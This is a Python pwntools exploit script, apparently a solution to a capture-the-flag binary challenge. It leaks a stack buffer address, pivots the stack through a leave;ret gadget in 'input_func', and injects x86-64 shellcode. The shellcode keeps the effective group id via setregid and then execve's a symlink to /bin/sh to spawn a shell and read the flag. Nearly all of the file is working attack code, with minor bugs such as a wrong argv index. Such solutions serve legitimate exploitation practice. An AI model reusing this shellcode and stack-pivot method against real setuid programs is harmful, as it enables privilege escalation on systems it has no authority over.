#!/usr/bin/env python
from pwn import *
import subprocess
import helpers
import pwn
import sys
import os

########################################################
# Setup                                                #
########################################################

# pwnlib forces objdump to use intel syntax, prevented by redefining 
# this function
pwnlib.asm._objdump = lambda *_: ['/usr/bin/x86_64-linux-gnu-objdump']

# get executable
prog = './'
if len(sys.argv) == 2:
  prog += sys.argv[2]
else:
  prog += os.path.basename(os.getcwd())
  prog = prog[:2] + prog[5:]

elf = ELF(prog)
target = elf.process()

# create a symlink and place '.' to PATH (no idea if this part works)
if os.path.exists('A'):
  subprocess.call('rm A', shell=True)
os.symlink('/bin/sh', 'A')
subprocess.call('export PATH=.:$PATH', shell=True)

# use for debugging
#context.terminal = ['tmux', 'splitw', '-h']
#target = gdb.debug([elf.path], gdbscript='''
#                    b *main
#                    c
#                    ''', env={'PATH':'.:/bin'})

# use for debugging
#target = process(prog, setuid=False)
#context.terminal = ['tmux', 'splitw', '-h']
#io = gdb.attach(target, gdbscript='b *main')

########################################################
# Exploit                                              #
########################################################
arch = 'x86-64'
shellcode = '''
    .att_syntax
    .att_mnemonic

    // geteid as args for rdi and rsi
    push $0x6c 
    pop %rax
    syscall

    push %rax
    pop %rsi
    push %rax 
    pop %rdi

    // setregid
    push $0x72
    pop %rax
    syscall

    // '/bin/sh'
    push $0x41
    push %rsp
    pop %rdi

    // other args
    push %rax
    pop %rsi
    cdq

    //execve
    push $0x3b
    pop %rax
    syscall
'''
# get buffer address
buffer_addr = int(target.recvline().split()[-1], 16)

# buffer to $ebp
buffer_to_rbp = 0x18

# get input_func address
input_func_addr = elf.symbols['input_func']


# payload has 5 components:
# 1. 'pwn.p64(buffer_addr+48)' the reason is the similar to
#    the issue presented in the 32 bit version, but instead
#    redirects the program towards the address that outside
#    of the intended buffer. This is so that I don't have to
#    shorten the code.
# 2. 'pwn.cyclic(buffer_to_rbp)' padding towards the buffer
# 3. 'pwn.p64(buffer_addr-8)' rbp is saved as -8 from the 
#    buffer address to account for offsets from leave and ret
# 4. 'pwn.p32(input_func_addr+108)' jumps to leave and ret 
#    in the input_func which is at offset +108; though not
#    clarified in the 32bit version, this is to allow for
#    rbp to replace rip
# 5. 'asm(shellcode, arch=arch)' shellcode
payload = b''.join([pwn.p64(buffer_addr+48),
                    pwn.cyclic(buffer_to_rbp),
                    pwn.p64(buffer_addr-8),
                    pwn.p64(input_func_addr+108),
                    asm(shellcode, arch=arch),
                    ])

########################################################
# Execution                                            #
########################################################
# use for debugging
#target.sendline(payload)
#target.sendline(b'cat flag')
#target.interactive()

# gets flag
flag = helpers.get_flag(elf, payload)
pwn.info(f'Flag: {flag}')
